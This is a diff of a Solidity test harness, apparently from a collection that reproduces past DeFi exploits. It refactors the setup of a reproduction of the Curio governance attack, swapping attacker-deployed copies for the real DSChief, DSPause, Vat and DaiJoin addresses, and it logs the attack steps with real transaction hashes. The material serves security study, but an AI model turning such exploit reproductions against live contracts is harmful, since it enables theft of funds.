@@ -16,13 +16,12 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
     IMERC20 curioCSCToken = IMERC20(0xfDcdfA378818AC358739621ddFa8582E6ac1aDcB);
 
     // Instances of relevant contracts
-    // Attacker contracts
     Action attackerContract;
     DSChief chief;
     DSPause pause;
     Vat vat;
     DaiJoin daiJoin;
-    IOUToken IOU;
+    IMERC20 IOU;
 
     // Peripheral contracts
     IForeignOmnibridge foreignOmniBridge = IForeignOmnibridge(0x69c707d975e8d883920003CC357E556a4732CD03);
@@ -45,10 +44,9 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
     }
 
     function test_attack() public {
-        // TODO we should adjust/warp each's step timestamp or block
-        console.log("\n==== STEP 0: Deploy attack contracts used by Action ====");
-        // These contracts were deployed almost 3 years before the attack
-        deployInitialContracts();
+        console.log("\n==== STEP 0: Instance protocol contracts ====");
+        // These contracts were deployed almost 3 years before the attack by Curio
+        _instanceCurioContracts();
 
         console.log("\n==== STEP 1: Send tokens to Omnibridge ====");
         // Approve tx: 0x0b4a076b4fe1d873b75e7fadc3d99e0240a61fa23f5327782416588f09c32295
@@ -72,7 +70,7 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
         console.log("\n==== STEP 3: Deploy Attacker's contract (called Action) ====");
         // Deploy tx: 0x99cc992de6e42a0817713489aeeb21f2d5e5fdca1f833826be09a9f35e5654e3
         cheat.prank(ATTACKER);
-        attackerContract = new Action(address(chief), address(pause));
+        attackerContract = new Action();
         require(address(attackerContract).code.length != 0, "Attacker's contract deployment failed");
         console.log("Attacker's contract deployement successful");
 
@@ -96,33 +94,23 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
         */
     }
 
-    function deployInitialContracts() internal {
-        // Chief deployment: 0x83661c0bb2d1288c523aba5aaa9f78d237eb6d068f5374ce221c38b0c088c598
+    function _instanceCurioContracts() internal {
+        // CSC Curio Token deployer: 0x63eA2D3fCb0759Ab9aD46eDc5269D7DebD0BDbe6
+
         // IOU deployment: 0x8b8ef358b5407298bc7e77e77575993a3f559b4f343e26f1c5cf721e6922cf46
-        cheat.prank(ATTACKER);
-        IOU = new IOUToken();
-        require(address(IOU).code.length != 0, "IOU token deployment failed");
-        console.log("IOU token contract deployement successful at: %s", address(IOU));
+        IOU = IMERC20(0xD29CAB1a24fC9fa22a035A7c3a0bF54a7cE7598D);
 
-        cheat.prank(ATTACKER);
-        chief = new DSChief(DSToken(address(cgtToken)), DSToken(address(IOU)), type(uint256).max);
-        require(address(chief).code.length != 0, "Chief deployment failed");
-        console.log("Chief contract deployement successful at: %s", address(chief));
+        // Chief deployment: 0x83661c0bb2d1288c523aba5aaa9f78d237eb6d068f5374ce221c38b0c088c598
+        chief = DSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
 
-        cheat.prank(ATTACKER);
-        pause = new DSPause(0, address(this), address(this)); // last two params unused
-        require(address(pause).code.length != 0, "Pause deployment failed");
-        console.log("Pause contract deployement successful at: %s", address(pause));
+        // Pause deployment: 0x5629b47d48a6af2956ce0ab966c8aa7a7fb99d6d1ebfa17d359f129b00b60aa2
+        pause = DSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);
 
-        cheat.prank(ATTACKER);
-        vat = new Vat();
-        require(address(vat).code.length != 0, "Vat deployment failed");
-        console.log("Vat contract deployement successful at: %s", address(vat));
+        // Vat deployment: 0x5fcb57eb4326220c3c0ae53cd78defed530a8cd4dddde28a45c4c7cd9a06b5f2
+        vat = Vat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
 
-        cheat.prank(ATTACKER);
-        daiJoin = new DaiJoin(address(vat), address(curioCSCToken));
-        require(address(vat).code.length != 0, "DaiJoin deployment failed");
-        console.log("DaiJoin contract deployement successful at: %s", address(daiJoin));
+        // DaiJoin deployment: 0xb467409f36f03fd0328e49858bfbd662b15a362fd932ed8c3e20892bba39229f
+        daiJoin = DaiJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);
     }
 
     function _labelAccounts() internal {
